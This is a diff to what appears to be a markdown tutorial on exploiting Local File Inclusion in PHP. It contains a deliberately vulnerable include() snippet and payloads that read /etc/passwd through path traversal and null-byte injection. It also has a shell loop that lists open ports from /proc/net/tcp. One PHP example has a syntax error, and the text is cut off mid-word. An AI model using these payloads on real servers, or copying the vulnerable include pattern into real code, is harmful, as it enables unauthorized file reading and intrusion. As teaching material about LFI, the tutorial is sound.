@@ -51,9 +51,11 @@ nano example.php
 ```text
 <?php
 	$filename = $_GET['file']; # ?file=example.php
-	include($filename);
+	include($filename);# to include a particular path include("/var/www/html/" . $filename), but you can bypass with ../../../.....
 ?>
 ```
+
+
 Right now you can exploit the LFI in your local machine with: `localhost/example.php?file=/etc/passwd`
 
 What can we do exploit with this?:
@@ -71,3 +73,15 @@ What can we do exploit with this?:
 	```
 	for port in $(cat /proc/net/tcp | awk '{print $2}' | grep -v local_address | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(printf $port=%d\n)" $((16#$port)); done
 	```
+#### Bypassing restriction for LFI
+[Still not developed]
+**Null Byte injection**
+Code example:
+```php
+<?php
+	$filename = $_GET['file'];
+	include("/var/www/html" . $filename ".randomextension");
+?>
+```
+You could avoid the extension reading adding a null byte injectio
+../../../../etc/passwd%00
